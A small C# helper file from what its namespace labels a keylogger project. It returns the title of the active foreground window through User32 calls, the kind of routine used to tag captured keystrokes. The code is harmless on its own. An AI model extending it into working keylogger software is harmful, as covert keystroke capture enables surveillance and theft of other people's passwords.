namespace Core.Keylogger.Helpers
{
    using System.Text;

    internal class Window
    {
        internal string CurrentWindowTitle()
        {
            int hwnd = User32.GetForegroundWindow();
            var title = new StringBuilder(1024);

            int textLength = User32.GetWindowText(hwnd, title, title.Capacity);
            if ((textLength <= 0) || (textLength > title.Length))
                return "[Unknown]";

            return "[" + title + "]";
        }
    }
}
